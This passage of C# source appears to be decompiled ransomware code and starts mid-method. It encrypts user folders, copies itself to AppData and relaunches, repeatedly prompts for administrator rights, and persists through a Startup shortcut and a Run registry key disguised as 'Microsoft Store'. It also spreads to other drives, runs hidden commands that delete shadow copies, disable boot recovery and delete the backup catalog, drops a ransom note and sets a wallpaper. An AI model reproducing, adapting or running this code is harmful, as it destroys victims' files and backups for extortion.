		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
